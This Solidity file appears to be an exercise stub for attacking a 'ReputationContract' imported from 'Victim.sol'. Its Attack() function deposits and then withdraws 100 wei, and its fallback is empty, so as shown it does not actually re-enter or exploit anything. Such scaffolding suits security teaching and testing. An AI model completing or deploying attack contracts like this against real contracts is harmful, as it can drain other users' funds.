// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Victim.sol";

contract ReputionAttacker {
    ReputationContract reputationContract;

    constructor(address reputationAddress) {
        reputationContract = ReputationContract(reputationAddress);
    }

    function Attack() public {
        require(address(this).balance >= 100, "Insufficient balance");
        reputationContract.deposit{value: 100}();
        reputationContract.withDraw(100);
    }

    fallback() external payable {}
}
